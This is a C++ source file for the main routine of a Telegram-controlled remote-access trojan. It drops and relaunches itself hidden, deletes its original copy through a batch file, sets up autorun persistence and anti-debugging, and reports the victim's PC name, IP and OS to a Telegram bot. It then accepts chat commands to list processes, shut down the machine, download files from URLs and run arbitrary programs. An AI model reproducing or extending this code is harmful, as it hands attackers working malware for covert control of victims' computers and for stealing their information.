/*
* github.com/4B4DB4B3
			4B4DB4B3 (c)
					15.10.2020	
*/

#include "common.h"
#include "Manager.h"
#include "Telegram.h"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
	srand((unsigned int)time(NULL));
	Settings s;
	ReadData(&s);

	char me[128] = { 0 };
	GetModuleFileNameA(0, me, sizeof(me) - 1);

	if (s.drop_run) {
		if (std::string(me) != s.drop) {
			CopyFileA(me, s.drop, false);
			ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);

			if (s.auto_delete) {
				std::string batch_autodel = "C:\\Users\\system.bat";
				std::ofstream bat(batch_autodel);
				bat << "@echo off\n";
				bat << "del " + std::string(me);
				bat << "\ndel " + batch_autodel;
				bat.close();

				ShellExecuteA(0, "open", batch_autodel.c_str(), 0, 0, SW_HIDE);
			}

			return 0;
		}
	}

	if (s.autorun_state) {
		Autorun(s.autorun);
	}

	if (s.protect_debuggers) {
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector, 0, 0, 0);
	}

	Telegram api(s.botapi);

	int ID = rand();
	std::string information = "User ID: " + std::to_string(ID) + "%0A"
		"Name: " + GetPCName() + "%0A"
		"IP: " + GetIP() + "%0A"
		"OS: " + GetOS() + "%0A"
		"For send command to this user, type: /user" + std::to_string(ID) + " command";
	api.SendTextMessage(s.chatid, information.c_str());

	std::string last;
	std::string prefix = "/user" + std::to_string(ID) + " ";
	std::string loader_pref = "loader ";
	std::string run_pref = "run ";
	while (true) {
		Sleep(atoi(s.client_delay));

		last = api.GetLastMessageText(atoi(s.chatid));
		if (last.substr(0, prefix.size()) == prefix) {
			std::string command = last.replace(last.find(prefix), prefix.size(), "");
			if (command == "processes") {
				std::string processes = prefix + "%0A%0A" + ProcessList();
				if (processes != "") {
					api.SendTextMessage(s.chatid, processes.c_str());
				}
			}
			else if (command == "disable display") {
				SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
			}
			else if (command == "disable pc") {
				system("shutdown -s");
			}
			else if (command == "close") {
				ExitProcess(0);
			}
			else if (command.substr(0, loader_pref.size()) == loader_pref) {
				std::vector<std::string> params = split(command, ' ');
				URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
				if (FileExists(params[2])) {
					std::string text = prefix + "%0A Success! File is uploaded to: " + params[2];
					api.SendTextMessage(s.chatid, text.c_str());
				}
				else {
					std::string text = prefix + "%0A Error! File not uploaded!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
			}
			else if (command.substr(0, run_pref.size()) == run_pref) {
				std::vector<std::string> params = split(command, ' ');
				if (params.size() == 2) {
					ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
					std::string text = prefix + "%0A Runned with arguments!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
				else {
					ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
					std::string text = prefix + "%0A Runned without arguments!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
			}
		}
		else if (last == "/online") {
			api.SendTextMessage(s.chatid, information.c_str());
		}
	}

	return 0;
}